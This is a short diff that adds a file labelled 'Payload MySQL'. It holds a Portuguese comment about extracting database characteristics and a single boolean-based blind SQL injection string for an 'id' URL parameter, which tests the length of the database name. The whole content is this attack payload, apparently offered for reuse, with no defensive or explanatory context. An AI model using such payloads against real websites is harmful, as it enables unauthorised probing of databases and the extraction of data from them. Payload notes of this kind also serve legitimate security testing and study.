@@ -1,0 +1,5 @@
+==============Payload MySQL==========
+
+extraindo características da database.
+
+  ?id=1' AND LENGTH(DATABASE()) > 2 --+
